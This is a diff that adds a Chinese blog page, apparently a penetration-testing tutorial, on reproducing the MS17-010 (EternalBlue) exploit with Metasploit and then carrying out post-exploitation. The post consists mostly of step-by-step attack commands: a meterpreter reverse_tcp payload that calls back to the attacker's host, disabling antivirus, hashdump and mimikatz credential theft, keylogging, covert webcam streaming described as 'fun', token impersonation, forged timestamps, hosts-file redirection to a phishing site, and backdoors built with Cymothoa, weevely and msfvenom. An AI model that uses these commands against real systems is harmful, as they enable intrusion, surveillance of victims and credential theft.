@@ -1,0 +1,775 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<!-- Head tag -->
+<head>
+    <link rel="icon" href="/favicon.ico">
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="google-site-verification" content="xBT4GhYoi5qRD5tr338pgPM5OWHHIDR6mNg1a3euekI" />
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="description" content="">
+    <meta name="keyword"  content="">
+    <link rel="shortcut icon" href="/img/ironman-draw.png">
+    <!-- Place this tag in your head or just before your close body tag. -->
+    <script async defer src="https://buttons.github.io/buttons.js"></script>
+    <title>
+        
+          MS17-010漏洞复现及后渗透测试 - 明心 | Blog
+        
+    </title>
+
+    <link rel="canonical" href="http://www.mingxin.live/漏洞复现/MS17-010漏洞复现及后渗透测试.html">
+
+    <!-- Bootstrap Core CSS -->
+    <link rel="stylesheet" href="/css/bootstrap.min.css">
+
+    <!-- Custom CSS --> 
+    <link rel="stylesheet" href="/css/beantech.min.css">
+
+    <link rel="stylesheet" href="/css/donate.css">
+    
+    <!-- Pygments Highlight CSS -->
+    <link rel="stylesheet" href="/css/highlight.css">
+
+    <link rel="stylesheet" href="/css/widget.css">
+
+    <link rel="stylesheet" href="/css/rocket.css">
+
+    <link rel="stylesheet" href="/css/signature.css">
+
+    <link rel="stylesheet" href="/css/toc.css">
+
+    <!-- Custom Fonts -->
+    <!-- <link href="https://maxcdn.bootstrapcdn.com/font-awesome/4.3.0/css/font-awesome.min.css" rel="stylesheet" type="text/css"> -->
+    <!-- Hux change font-awesome CDN to qiniu -->
+    <link href="https://cdn.staticfile.org/font-awesome/4.5.0/css/font-awesome.min.css" rel="stylesheet" type="text/css">
+
+
+    <!-- Hux Delete, sad but pending in China
+    <link href='http://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic' rel='stylesheet' type='text/css'>
+    <link href='http://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800' rel='stylesheet' type='text/
+    css'>
+    -->
+
+
+    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
+    <![endif]-->
+
+    <!-- ga & ba script hoook -->
+    <script></script>
+</head>
+
+
+<!-- hack iOS CSS :active style -->
+<body ontouchstart="">
+	<!-- Modified by Yu-Hsuan Yen -->
+<!-- Post Header -->
+<style type="text/css">
+    header.intro-header{
+        
+            background-image: url('/img/article_header/4.jpg')
+            /*page*/
+        
+    }
+    
+    #signature{
+        background-image: url('//img/signature/明心.gif');
+    }
+    
+</style>
+
+<header class="intro-header" >
+    <!-- Signature -->
+    <div id="signature">
+        <div class="container">
+            <div class="row">
+                <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                
+                    <div class="site-heading">
+                        <h1>MS17-010漏洞复现及后渗透测试</h1>
+                        <!--<hr class="small">-->
+                        <span class="subheading">道阻且长，行则将至</span>
+                    </div>
+                
+
+
+                </div>
+            </div>
+        </div>
+    </div>
+</header>
+
+	
+    <!-- Navigation -->
+<nav class="navbar navbar-default navbar-custom navbar-fixed-top">
+    <div class="container-fluid">
+        <!-- Brand and toggle get grouped for better mobile display -->
+        <div class="navbar-header page-scroll">
+            <button type="button" class="navbar-toggle">
+                <span class="sr-only">Toggle navigation</span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+            </button>
+            <a class="navbar-brand" href="/">Ming Xin</a>
+        </div>
+
+        <!-- Collect the nav links, forms, and other content for toggling -->
+        <!-- Known Issue, found by Hux:
+            <nav>'s height woule be hold on by its content.
+            so, when navbar scale out, the <nav> will cover tags.
+            also mask any touch event of tags, unfortunately.
+        -->
+        <div id="huxblog_navbar">
+            <div class="navbar-collapse">
+                <ul class="nav navbar-nav navbar-right">
+                    <li>
+                        <a href="/">Home</a>
+                    </li>
+
+                    
+
+                        
+                    
+
+                        
+                        <li>
+                            <a href="/archive/">Archives</a>
+                        </li>
+                        
+                    
+
+                        
+                        <li>
+                            <a href="/about/">About</a>
+                        </li>
+                        
+                    
+
+                        
+                        <li>
+                            <a href="/tags/">Tags</a>
+                        </li>
+                        
+                    
+
+                        
+                        <li>
+                            <a href="/漏洞复现/">漏洞复现</a>
+                        </li>
+                        
+                    
+
+                        
+                        <li>
+                            <a href="/漏洞复现/MS17-010漏洞复现及后渗透测试.html">MS17-010漏洞复现及后渗透测试</a>
+                        </li>
+                        
+                    
+                    
+                </ul>
+            </div>
+        </div>
+        <!-- /.navbar-collapse -->
+    </div>
+    <!-- /.container -->
+</nav>
+<script>
+    // Drop Bootstarp low-performance Navbar
+    // Use customize navbar with high-quality material design animation
+    // in high-perf jank-free CSS3 implementation
+    var $body   = document.body;
+    var $toggle = document.querySelector('.navbar-toggle');
+    var $navbar = document.querySelector('#huxblog_navbar');
+    var $collapse = document.querySelector('.navbar-collapse');
+
+    $toggle.addEventListener('click', handleMagic)
+    function handleMagic(e){
+        if ($navbar.className.indexOf('in') > 0) {
+        // CLOSE
+            $navbar.className = " ";
+            // wait until animation end.
+            setTimeout(function(){
+                // prevent frequently toggle
+                if($navbar.className.indexOf('in') < 0) {
+                    $collapse.style.height = "0px"
+                }
+            },400)
+        }else{
+        // OPEN
+            $collapse.style.height = "auto"
+            $navbar.className += " in";
+        }
+    }
+</script>
+
+
+    <!-- Main Content -->
+    <!-- Main Content -->
+<div class="container">
+    <div class="row">
+        
+
+<!-- USE SIDEBAR -->
+    <!-- Post Container -->
+            <div class="
+                col-lg-8 col-lg-offset-1
+                col-md-8 col-md-offset-1
+                col-sm-12
+                col-xs-12
+                post-container
+            ">
+            
+                <h1 id="ms17-010漏洞复现及后渗透测试">MS17-010漏洞复现及后渗透测试</h1>
+<h2 id="一漏洞原理">一：漏洞原理</h2>
+<h3 id="1简介">1：简介</h3>
+<p>永恒之蓝漏洞是方程式组织在其漏洞利用框架中一个针对<strong>SMB服务</strong>进行攻击的漏洞，该漏洞导致攻击者在目标系统上<strong>可以执行任意代码</strong>。</p>
+<p>注：SMB服务的作用：该服务在Windows与UNIX系列OS之间搭起一座桥梁，让两者的资源可互通有无，SMB服务详解：<a href="https://www.cnblogs.com/aisa/p/8624720.html" target="_blank" rel="noopener">点击查看</a></p>
+<h3 id="2漏洞原理代码详解">2：漏洞原理代码详解</h3>
+<p><strong>下面两篇文章从实际代码详细分析了漏洞原理</strong></p>
+<p><a href="http://blogs.360.cn/post/nsa-eternalblue-smb.html#toc-772" target="_blank" rel="noopener">http://blogs.360.cn/post/nsa-eternalblue-smb.html#toc-772</a></p>
+<p><a href="https://blog.csdn.net/qq_27446553/article/details/73480807" target="_blank" rel="noopener">https://blog.csdn.net/qq_27446553/article/details/73480807</a></p>
+<h2 id="二漏洞复现">二：漏洞复现</h2>
+<h3 id="1信息收集">1：信息收集</h3>
+<p>信息收集的两种方法：</p>
+<p>使用msf的扫描模块，通过search scanner可以查看大量的扫描模块，这里通过<code>search portscan</code>命令查看端口扫描器列表，输入<code>use 模块名</code>，即可使用该模块</p>
+<p>例：这里使用syn扫描模块为例</p>
+<p><img src="//mingxin.live/img/ms-17010/1.jpg" alt=""></p>
+<p><img src="//mingxin.live/img/ms-17010/2.jpg" alt=""></p>
+<p><img src="//mingxin.live/img/ms-17010/3.jpg" alt=""></p>
+<p>可以看到这里扫描的结果显示目标记器0-500的端口内开了135,139，445端口。而永恒之蓝利用的就是445端口 smb服务 操作系统溢出漏洞</p>
+<p>使用nmap扫描</p>
+<p>在msf也可以使用nmap进行扫描进行信息收集，示例如下：</p>
+<p>①：扫描版本服务</p>
+<p><img src="//mingxin.live/img/ms-17010/4.jpg" alt=""></p>
+<p><strong>若扫描出来有可能存在的漏洞的服务，可以search 该服务，查看可以利用的攻击模块</strong></p>
+<p>这里从收集信息来看目标主机445端口开放，可以尝试使用ms17-010（永恒之蓝）来攻击</p>
+<h3 id="2尝试攻击">2：尝试攻击</h3>
+<h4 id="1gt查看漏洞模块-search-ms17-010">1&gt;：查看漏洞模块------<code>search ms17-010</code></h4>
+<p><img src="//mingxin.live/img/ms-17010/5.jpg" alt=""></p>
+<p>可以看到有auxiliary（辅助）模块和exploit（攻击）模块</p>
+<h4 id="2gt可以先使用辅助扫描模块测试-use-auxiliaryscannersmbsmb_ms17_010">2&gt;：可以先使用辅助扫描模块测试 <code>use auxiliary/scanner/smb/smb_ms17_010</code></h4>
+<p>扫描结果显示该主机很容易受到ms17-010的攻击</p>
+<p><img src="//mingxin.live/img/ms-17010/6.jpg" alt=""></p>
+<h4 id="3gt使用攻击模块进行攻击-use-exploitwindowssmbms17_010_eternalblue">3&gt;：使用攻击模块进行攻击 <code>use exploit/windows/smb/ms17_010_eternalblue</code></h4>
+<p>选择攻击模块时注意选择合适的版本，有些版本使用于win8以上</p>
+<p><code>set payload</code> ：设置payload，这里用<code>set payload windows/x64/meterpreter/reverse_tcp</code></p>
+<p>要选用其他payload可以<strong>使用show payloads查看适合要攻击的目标主机的payload</strong></p>
+<p><strong>show options</strong> ：使用该命令会列出使用当前模块所需呀配置的参数</p>
+<p><strong>set RHOST 目标主机地址</strong> ：该命令会设置好要攻击的目标主机地址</p>
+<p><strong>set LHOST 攻击机地址</strong> ：该命令设置攻击机的地址，使目标主机回连至攻击机</p>
+<p><strong>set LPORT 回连的端口</strong> ：该命令设置目标主机回连至攻击机的端口，默认为4444</p>
+<p><strong>run</strong>：开始攻击</p>
+<p><strong>攻击成功后攻击机和目标主机之间会建立一个连接，得到一个meterpreter会话</strong></p>
+<p><img src="//mingxin.live/img/ms-17010/7.jpg" alt=""></p>
+<p>上面已经对攻击的信息做了标注，这里进行解释：</p>
+<p>①：表示永恒之蓝覆盖成功完成</p>
+<p>②：目标主机和攻击机建立了了一个shell连接，会话为session 1</p>
+<p>③：得到一个meterpreter会话，尝试获取shell失败</p>
+<p>④：在meterpreter会话下输入ps就能获得目标主机的当前进程</p>
+<p><strong>注：</strong> meterpreter是metasploit框架中的一个扩展模块，是后渗透攻击中的杀手锏，使用meterpreter作为攻击载荷，建立连接后可以对目标系统进行更深入的渗透</p>
+<p><strong>到这里漏洞攻击已经成功，接下来要做的就是后渗透攻击，涉及到权限提升，跳板攻击，密码哈希值获取，获取shell以及其他更多信息</strong></p>
+<h2 id="三meterpreter模块之后渗透攻击">三：meterpreter模块之后渗透攻击</h2>
+<p><strong>后渗透测试是极为关键的，也是测试客户业务是否安全影响最大的一步</strong></p>
+<p><strong>以下所有操作均是在meterpreter模块下，获取目标主机的meterpreter shell为所有操作的前提</strong></p>
+<h3 id="1进程迁移">1：进程迁移</h3>
+<p>进程迁移的原因与目的：在刚拿到meterpreter shell时，该shell是极其脆弱的，通过进程迁移，把该shell和一个稳定的进程绑定在一起，防止被检测到查杀。</p>
+<p><strong>1.1：获取目标主机正在运行的进程</strong></p>
+<p>指令：<code>ps</code></p>
+<p><strong>1.2：查看meterpreter shell的进程号</strong></p>
+<p>指令：<code>getpid</code></p>
+<p><strong>1.3：进程迁移 （先找一个稳定的已打开的的应用进程</strong>）</p>
+<p>指令：<code>migrate &lt;稳定的进程号&gt;</code></p>
+<p>此时再次使用 ps 指令，会发现原来的meterpreter shell的进程号没了，即该shell已经被绑定在计划中的稳定进程上了</p>
+<p><strong>1.4：自动进行进程迁移 （系统会自动寻找合适的进程进行迁移）</strong></p>
+<p>指令：<code>run post/windows/manage/migrate</code></p>
+<p><img src="//mingxin.live/img/ms-17010/8.jpg" alt=""></p>
+<p><img src="//mingxin.live/img/ms-17010/9.jpg" alt=""></p>
+<h3 id="2系统命令">2：系统命令</h3>
+<p><strong>2.1：查看系统信息</strong></p>
+<p>指令：<code>sysinfo</code></p>
+<p><strong>2.2：查看目标主机运行时间</strong></p>
+<p>指令：<code>idletime</code></p>
+<p><strong>2.3：查看目标机是否运行在虚拟机上</strong></p>
+<p>指令：<code>run post/windows/gather/checkvm</code></p>
+<p><strong>2.4：查看当前主机用户名及其权限</strong></p>
+<p>指令：<code>getuid</code></p>
+<p><strong>2.5：关闭杀毒软件</strong></p>
+<p>指令：<code>run post/windows/manage/killav</code></p>
+<p><strong>2.6：启动目标主机的3389端口即远程桌面协议</strong></p>
+<p>①指令：<code>run post/windows/manage/enable_rdp</code></p>
+<p>②指令：<code>run getgui -e</code></p>
+<p><img src="//mingxin.live/img/ms-17010/10.jpg" alt=""></p>
+<p><strong>2.7：将当前会话放到后台</strong></p>
+<p>指令：<code>background</code></p>
+<p><strong>2.8：端口转发</strong></p>
+<p>指令：<code>portfwd add -l 6666 -p 3389 -r 127.0.0.1</code> #将目标机的3389端口转发到本地6666端口</p>
+<p>指令：<code>run getgui -f 6661 --e</code></p>
+<p>实现效果如图：</p>
+<p><img src="//mingxin.live/img/ms-17010/11.jpg" alt=""></p>
+<p><strong>2.9：路由route操作</strong></p>
+<p><strong>①：查看已拿下的目标主机的内网IP段情况</strong></p>
+<p>指令：<code>run get_local_subnets</code></p>
+<p><strong>②：添加路由（先使用background将meterpreter终端放到后台）</strong></p>
+<p>指令1：<code>route add &lt;要添加的路由&gt;</code> 例：route add 192.168.111.0</p>
+<p><code>route print</code>（查看已添加的路由）</p>
+<p>指令2：<code>run autoroute -s 192.168.159.0/24</code> #添加到目标环境网络</p>
+<p><code>run autoroute --p</code>#查看添加的路由</p>
+<p>当目的路由被成功添加到已攻陷主机的路由表中，就可以借助被攻陷的主机对其他网络进行攻击了。</p>
+<p>添加路由后可以进行以被攻陷主机的ip扫描该网段下的其他主机</p>
+<p><code>run post/windows/gather/arp_scanner RHOSTS=192.168.159.0/24</code></p>
+<p><code>run auxiliary/scanner/portscan/tcp RHOSTS=192.168.159.144 PORTS=338</code></p>
+<p><code>route print</code>：显示当前活跃的路由设置，查看路由是否添加成功</p>
+<p><strong>2.10：关闭杀毒软件</strong></p>
+<p>命令：<code>run killav</code></p>
+<p><strong>2.11：列举当前目标机有多少用户登录</strong></p>
+<p>命令：<code>run post/windows/gather/enum_logged_on_users</code></p>
+<p><img src="//mingxin.live/img/ms-17010/12.jpg" alt=""></p>
+<p><strong>2.12：添加用户</strong></p>
+<p>①：<code>run post/windows/manage/enable_rdp USERNAME=xxx PASSWORD=xxx</code></p>
+<p>②：<code>run getgui -u example_username -p example_password</code></p>
+<p><strong>2.13：抓取目标机的屏幕截图</strong></p>
+<p>命令：</p>
+<p>①：先输入<code>load espia</code> 加载插件 再输<code>screengrab</code>，会保存截图在root目录下</p>
+<p>②：输入 <code>screenshot</code> 效果同上</p>
+<p><img src="//mingxin.live/img/ms-17010/13.jpg" alt=""></p>
+<p><strong>截取的图片</strong></p>
+<p><img src="//mingxin.live/img/ms-17010/14.jpg" alt=""></p>
+<p><strong>2.14：webcam摄像头命令</strong></p>
+<p>①：查看目标机是否有摄像头：<code>webcam_list</code></p>
+<p>②：打开目标主机的摄像头拍一张照片：<code>webcam_snap</code></p>
+<p>③：打开目标主机的摄像头抓取视频（即直播）</p>
+<p>指令：<code>webcam_stream</code></p>
+<p>该指令会返回一个url，在浏览器打开该地址即可观看</p>
+<p><em>可以试一下这个命令，很好玩</em></p>
+<p><strong>2.15：进入目标机shell，获取目标主机的远程命令行</strong></p>
+<p>（如果出错，考虑是目标主机限制了cmd.exe的访问权，可以使用migrate注入到管理员用户进程中再尝试）</p>
+<p>指令为：shell 结束指令为：<code>exit</code></p>
+<h3 id="3文件系统命令">3：文件系统命令</h3>
+<p><strong>常用指令如下</strong></p>
+<p><em>这些命令比较简单，但却很重要，就不截图详细说明了</em></p>
+<p><code>getwd</code>或者<code>pwd</code># 查看当前工作目录</p>
+<p><code>ls</code> #显示当前目录下的内容</p>
+<p><code>cd</code> #切换目录</p>
+<p><code>search -f *.txt -d c:\</code> # 搜索文件 -f 指定文件类型，-d 指定在哪个目录下搜索</p>
+<p><code>cat c:\\test\\testpasswd.txt</code># 查看文件内容</p>
+<p><code>upload /tmp/hack.txt C:\test</code> # 上传hack.txt文件到目标机C盘test目录下</p>
+<p><code>download c:\test.txt/root</code> # 下载目标主机test.txt文件到本机root目录下</p>
+<p><code>edit c:\\1.txt</code> #编辑或创建文件 没有的话，会新建文件</p>
+<p><code>rm C:\\lltest\\hack.txt</code></p>
+<p><code>mkdir lltest2</code> #只能在当前目录下创建文件夹</p>
+<p><code>rmdir lltest2</code> #只能删除当前目录下文件夹</p>
+<p><code>getlwd</code> 或者 <code>lpwd</code> #操作攻击者主机 查看当前目录</p>
+<p><code>lcd /tmp</code> #操作攻击者主机 切换目录</p>
+<h3 id="4其他常用命令">4：其他常用命令</h3>
+<p><strong>4.1：session命令</strong></p>
+<p>session 命令可以查看已经成功获取的会话</p>
+<p>可以使用<code>session -i</code> 连接到指定序号的meterpreter会话已继续利用</p>
+<p><strong>4.2：timestomp伪造时间戳</strong></p>
+<p>时间戳的解释http://blog.csdn.net/qq_41651465/article/details/80005362</p>
+<p><code>timestomp C:// -h</code> #查看帮助</p>
+<p><code>timestomp -v C://2.tx</code>t #查看时间戳</p>
+<p><code>timestomp C://2.txt -f C://1.txt</code> #将1.txt的时间戳复制给2.txt</p>
+<p><strong>4.3：键盘记录器功能keyscan</strong></p>
+<p>命令：</p>
+<p><code>keyscan_start</code> 开启记录目标主机的键盘输入</p>
+<p><code>keyscan_dump</code> 输出截获到的目标键盘输入字符信息</p>
+<p><code>keyscan_stop</code> 停止键盘记录</p>
+<p><strong>4.4：系统账号密码获取</strong></p>
+<p>①：命令：<code>hashdump</code></p>
+<p><em>在拿到system权限下，使用该命令，可以查看系统账号密码的hash值，在cmd5在线破解网站可以尝试破解，或者采用后面的Mimikatz模块尝试爆破</em></p>
+<p>②：使用hashdump脚本</p>
+<p>命令：<code>run hashdump</code></p>
+<p><img src="//mingxin.live/img/ms-17010/15.jpg" alt=""></p>
+<p><strong>4.5：edit命令</strong></p>
+<p>调用vi编辑器，对目标主机上的文件修改</p>
+<p>例如修改目标主机上的hosts文件，使得目标主机访问baidu时去到准备好的钓鱼网站</p>
+<p><strong>4.6：execute命令</strong></p>
+<p>在目标主机上运行某个程序 结合参数-H使用可以隐藏在后台打开程序</p>
+<p>例：命令：<code>execute -H -i -f cmd.exe</code> 相当于获取shell，使用shell</p>
+<p><strong>4.7：信息收集</strong></p>
+<p><code>run post/windows/gather/enum_applications</code>：获取目标主机上的软件安装信息</p>
+<p><code>run post/windows/gather/dumplinks</code>：目标主机上最近访问过的文档和链接信息</p>
+<p><strong>查看目标主机是否为虚拟机</strong></p>
+<p><code>run post/windows/gather/checkvm</code> #是否虚拟机</p>
+<p><code>run post/linux/gather/checkvm</code> #是否虚拟机</p>
+<p><strong>4.8：权限提升</strong></p>
+<p>先输入<code>getuid</code>查看已获得的权限</p>
+<p>尝试使用<code>getsystem</code>提权（倘若失败，只能使用内核漏洞提权）</p>
+<p><strong>4.9：漏洞提权：</strong></p>
+<p>①：使用命令：<strong>getsystem</strong>提权</p>
+<p>②：使用其他漏洞攻击提权，如ms16-32</p>
+<p><strong>注意</strong>：在使用其他漏洞为当前会话提权时，攻击参数要设置好session 为当前对话的session，这样就能使用其他漏洞为当前会话提权了</p>
+<p><strong>4.10： 抓取密码</strong></p>
+<p>常见的在system权限下使用命令 <strong>hashdump</strong> 可以查看目标主机的用户和其对应的密码，其他抓取密码方法如下：</p>
+<p>1：使用Qarks PwDump抓取密码，适用于Windows</p>
+<p>2：使用Windows Credentials Editor 抓取密码，适用于Windows</p>
+<p>3：使用Mimikatz抓取密码，metasploit集成（只能在管理员权限下使用）</p>
+<p>①：<code>load mimikatz</code> （加载该模块）</p>
+<p>②：<code>msv</code> 抓取系统的hash值</p>
+<p>③：<code>mimikatz_command -f samdump::</code>抓取Hash</p>
+<p>④：<code>mimikatz_command -f service::</code>查看服务</p>
+<p><strong>输入help mimikatz，可以查看所有mimikatz在metasploit里集成的命令，即可直接使用的命令</strong></p>
+<p>例：用msv命令可以抓取系统的Hash值，用wdigest命令可以获取系统账户信息</p>
+<p><img src="//mingxin.live/img/ms-17010/16.jpg" alt=""></p>
+<p><strong>使用mimikatz_command -f 加载一个不存在的模块，会显示所有mimikatz模块</strong></p>
+<p><img src="//mingxin.live/img/ms-17010/17.jpg" alt=""></p>
+<p><strong>使用模块时在模块后面跟 :: 设置参数，当后面参数为空时，显示可用参数</strong></p>
+<p><img src="//mingxin.live/img/ms-17010/18.jpg" alt=""></p>
+<p><img src="//mingxin.live/img/ms-17010/19.jpg" alt=""></p>
+<p><strong>4.11：令牌欺骗</strong></p>
+<p><strong>注</strong>：令牌是交互会话中的唯一身份标识符，假冒令牌的目的就是取得的令牌对应的身份的权限</p>
+<p>1&gt;：先输入<code>use incognito</code></p>
+<p>2&gt;：再输入<code>list_tokens -u</code>作用：列出所有可用的token</p>
+<p>（注：令牌分为：①授权令牌 Delegation Tokens 支持交互式登陆 ②模拟令牌 impersonation Tokens 非交互式令牌）</p>
+<p>3&gt;：再输入<code>impersonate_token 上面获取的授权令牌</code>（注：获取的令牌Hostname\Username应将中间的 \ 改为 \\ ）</p>
+<p><img src="//mingxin.live/img/ms-17010/20.jpg" alt=""></p>
+<h3 id="5后门">5：后门</h3>
+<p><strong>5.1：Cymothoa后门</strong></p>
+<p><strong>Cymothoa工具可以把ShellCode注入现有进程，伪装成常规程序</strong></p>
+<p><strong>用法如下：</strong></p>
+<p>1：使用-p参数设置目标进程的pid</p>
+<p>2：使用-s参数指定ShellCode的编号，查看所有ShellCode的编号使用命令：cymothoa -s</p>
+<p>3：使用-y参数指定Payload服务端口号</p>
+<p><strong>完整命令示例：<code>cymothoa -p 100 -s 1 -y 4444</code></strong></p>
+<p>注入成功后可以使用如下命令来连接目标主机的后门，等待返回shell</p>
+<p><strong><code>Nc -nvv 目标主机IP 4444</code></strong></p>
+<p><strong>5.2：weevely</strong></p>
+<p><strong>用法如下：</strong></p>
+<p>1&gt;：生成后门</p>
+<p>命令：<code>weevely generate password/存放路径/try.php</code></p>
+<p>生成一个名为try.php的后门，密码为password</p>
+<p>2&gt;：上传后门至web根目录下/var/www/html/（上传命令在之前的文件命令讲过，不再赘述）</p>
+<p>3&gt;：连接后门</p>
+<p>命令：<code>weevely 目标主机IP/shell所在目录/1.php password（密码）</code></p>
+<p><em>weevely还可以生成图片后门。同时weevely还有多个模块使用，在连接上后门之后按两次Tab键，可以查看可利用的模块</em></p>
+<p><strong>5.3：meterpreter后门</strong></p>
+<p><strong>用法如下：</strong></p>
+<p>1&gt;：使用使用msfvenom创建shell，shell的类型可以自己选自，可以为php文件，exe文件等等</p>
+<p>注：php文件可以放在web根目录下，方便直接启动</p>
+<p>2&gt;： 上传shell到目标服务器（上传命令在之前的文件命令讲过，不再赘述）</p>
+<p>3&gt;：在msf下设置监听模块，开始监听，设置方法为：</p>
+<p>①：<code>use exploit/multi//handler</code></p>
+<p>②：<code>set payload （payload可以自行选择）</code></p>
+<p>③：访问或运行shell</p>
+<p>④：获得目标主机反弹的shell，连接建立</p>
+<p>这里以一个exe文件为例，大家可以尝试其他web文件</p>
+<p>1&gt;：创建shell</p>
+<p><img src="//mingxin.live/img/ms-17010/21.jpg" alt=""></p>
+<p>2&gt;：上传shell</p>
+<p><img src="//mingxin.live/img/ms-17010/22.jpg" alt=""></p>
+<p>3&gt;：设置监听模块，开始监听</p>
+<p><img src="//mingxin.live/img/ms-17010/23.jpg" alt=""></p>
+
+
+                <br>
+
+                <!-- require APlayer -->
+                
+
+                <!-- 如果开启评论功能 -->
+                
+                    <hr>
+
+                    
+
+                    
+
+                    
+
+                    
+
+                    
+
+                    
+
+                
+            </div>
+
+          <!-- Sidebar Container -->
+<div class="
+    col-lg-3 col-lg-offset-0
+    col-md-3 col-md-offset-0
+    col-sm-12
+    col-xs-12
+    sidebar-container
+">
+    
+        <!-- Featured Tags -->
+
+<section>
+    <!-- no hr -->
+    <h5><a href="/tags/">FEATURED TAGS</a></h5>
+    <div class="tags">
+        
+            
+            <a href="/tags/#渗透测试" title="渗透测试" rel="2">渗透测试</a>
+            
+        
+    </div>
+</section>
+
+        <hr>
+    
+        <!-- Short About -->
+<section class="visible-md visible-lg">
+    <h5><a href="/about/">ABOUT ME</a></h5>
+    <div class="short-about">
+
+        
+            <img id = "avatar_pic" src="/img/avatar/mx.jpg" />
+        
+
+        
+            <p>道阻且长，行则将至</p>
+        
+
+        <!-- SNS Link -->
+        <ul class="list-inline">
+            
+            
+            
+
+            
+
+            
+
+            
+                <li>
+                    <a target="_blank"  href="https://github.com/MX-LQ">
+                        <span class="fa-stack fa-lg">
+                            <i class="fa fa-circle fa-stack-2x"></i>
+                            <i class="fa fa-github fa-stack-1x fa-inverse"></i>
+                        </span>
+                    </a>
+                </li>
+            
+            
+            
+            
+        </ul>
+    </div>
+</section>
+
+        <hr>
+    
+        
+  <h5>RECENT POSTS</h3>
+  <div class="widget">
+    <ul>
+      
+        <li>
+          <a href="/article/信息搜集之谷歌语法/">信息搜集之谷歌语法</a>
+        </li>
+      
+        <li>
+          <a href="/article/SSH后门安装/">SSH后门安装</a>
+        </li>
+      
+    </ul>
+  </div>
+
+        <hr>
+    
+        <!-- Friends Blog -->
+
+<h5>FRIENDS</h5>
+<ul class="list-inline">
+
+    
+        <li><a href="https://blog.csdn.net/qq_41880069" target="_blank">CSDN Blog MX-LQ</a></li>
+    
+        <li><a href="https://www.secquan.org/users/明心" target="_blank">圈子社区 ID 明心</a></li>
+    
+        <li><a href="https://github.com/MX-LQ" target="_blank">GitHub ID MX-LQ </a></li>
+    
+        <li><a href="http://www.mignxin.top" target="_blank">明心 |Blog2 </a></li>
+    
+</ul>
+
+        <hr>
+    
+        
+    <h5>ARCHIVES</h5>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/04/">April 2019</a><span class="archive-list-count">2</span></li></ul>
+    </div>
+
+        <hr>
+    
+</div>
+
+        
+    </div>
+</div>
+
+
+    <!-- Footer -->
+    <!-- Footer -->
+<footer>
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <ul class="list-inline text-center">
+                
+                
+                
+
+                
+
+                
+
+                
+                    <li>
+                        <a target="_blank"  href="https://github.com/MX-LQ">
+                            <span class="fa-stack fa-lg">
+                                <i class="fa fa-circle fa-stack-2x"></i>
+                                <i class="fa fa-github fa-stack-1x fa-inverse"></i>
+                            </span>
+                        </a>
+                    </li>
+                
+
+                
+
+                </ul>
+                <p class="copyright text-muted">
+                    Copyright &copy; 明心 2019 
+                    <br>
+                      Welcome you<a href="http://www.mingxin.live">made by 明心</a>
+                    <span style="display: inline-block; margin: 0 5px;">
+                        <i class="fa fa-heart"></i>
+                    </span> 
+                     About <a href="http://www.mingxin.live">明心</a> | 
+                    <iframe
+                        style="margin-left: 2px; margin-bottom:-5px;"
+                        frameborder="0" scrolling="0" width="91px" height="20px"
+                        src="https://ghbtns.com/github-btn.html?user=MX-LQ&repo=MX-LQ.github.io&type=star&count=true" >
+                    </iframe>
+                </p>
+            </div>
+        </div>
+    </div>
+</footer>
+
+<!-- jQuery -->
+<script src="/js/jquery.min.js"></script>
+
+<!-- Bootstrap Core JavaScript -->
+<script src="/js/bootstrap.min.js"></script>
+
+<!-- Custom Theme JavaScript -->
+<script src="/js/hux-blog.min.js"></script>
+
+
+<!-- async load function -->
+<script>
+    function async(u, c) {
+      var d = document, t = 'script',
+          o = d.createElement(t),
+          s = d.getElementsByTagName(t)[0];
+      o.src = u;
+      if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+      s.parentNode.insertBefore(o, s);
+    }
+</script>
+
+<!-- 
+     Because of the native support for backtick-style fenced code blocks 
+     right within the Markdown is landed in Github Pages, 
+     From V1.6, There is no need for Highlight.js, 
+     so Huxblog drops it officially.
+
+     - https://github.com/blog/2100-github-pages-now-faster-and-simpler-with-jekyll-3-0  
+     - https://help.github.com/articles/creating-and-highlighting-code-blocks/    
+-->
+<!--
+    <script>
+        async("http://cdn.bootcss.com/highlight.js/8.6/highlight.min.js", function(){
+            hljs.initHighlightingOnLoad();
+        })
+    </script>
+    <link href="http://cdn.bootcss.com/highlight.js/8.6/styles/github.min.css" rel="stylesheet">
+-->
+
+
+<!-- jquery.tagcloud.js -->
+<script>
+    // only load tagcloud.js in tag.html
+    if($('#tag_cloud').length !== 0){
+        async("http://www.mingxin.live/js/jquery.tagcloud.js",function(){
+            $.fn.tagcloud.defaults = {
+                //size: {start: 1, end: 1, unit: 'em'},
+                color: {start: '#bbbbee', end: '#0085a1'},
+            };
+            $('#tag_cloud a').tagcloud();
+        })
+    }
+</script>
+
+<!--fastClick.js -->
+<script>
+    async("https://cdn.bootcss.com/fastclick/1.0.6/fastclick.min.js", function(){
+        var $nav = document.querySelector("nav");
+        if($nav) FastClick.attach($nav);
+    })
+</script>
+
+
+<!-- Google Analytics -->
+
+
+<script>
+    // dynamic User by Hux
+    var _gaId = 'UA-XXXXXXXX-X';
+    var _gaDomain = 'yoursite';
+
+    // Originial
+    (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+    (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+    m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+    })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+    ga('create', _gaId, _gaDomain);
+    ga('send', 'pageview');
+</script>
+
+
+
+
